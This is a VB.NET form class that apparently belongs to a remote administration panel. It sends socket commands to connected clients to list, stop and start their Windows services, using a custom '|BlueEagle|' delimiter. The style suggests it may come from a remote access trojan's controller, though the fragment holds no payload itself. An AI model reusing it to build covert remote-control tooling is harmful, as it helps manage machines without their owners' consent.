Public Class ServiceController
    Dim rr As New TextBox

    Private controllers As New System.Collections.Generic.SortedList(Of String, ServiceController)

    Public sock As Integer
    Dim state As Integer
    Dim time As Integer

    Private Sub ServiceController_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        rr.Text = 1
        Timer3.Enabled = True
        Main.S.Send(sock, "GOs")



        If state = 1 Then

            Timer1.Interval = time
            Timer1.Start()
        Else

            Timer1.Stop()
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ListView1.Items.Clear()



    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Dim xt$

        xt = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text()
        If xt = "Stopped" Then
            RunServiceToolStripMenuItem.Enabled = True ' run
            StopServiceToolStripMenuItem.Enabled = False ' stop 
        End If
        If xt = "Running" Then
            RunServiceToolStripMenuItem.Enabled = False ' run
            StopServiceToolStripMenuItem.Enabled = True  ' stop 
        End If

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        On Error Resume Next
        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("Stopped") Then

                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 0
            ElseIf Process.Text.Contains("Running") Then
                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 1
            End If

        Next


        'Process.BackColor = Color.LightSteelBlue



    End Sub

    Private Sub StopServiceToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles StopServiceToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Voz" & "|BlueEagle|" & "0") ' stop
        Next
    End Sub

    Private Sub RunServiceToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunServiceToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Voz" & "|BlueEagle|" & "1") ' run
        Next
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        rr.Text += 1

        If rr.Text = 25 Then
            Me.Opacity = 9.9R

            Timer3.Enabled = False
        End If
    End Sub

    Private Sub RefreshServicesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshServicesToolStripMenuItem.Click
        ListView1.Items.Clear()

        Me.Opacity = 0.8R
        rr.Text = 1
        Timer3.Enabled = True
        Main.S.Send(sock, "GOs")
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Dim C As String
        C = ListView1.Items.Count.ToString
        Label2.Text = C
    End Sub
End Class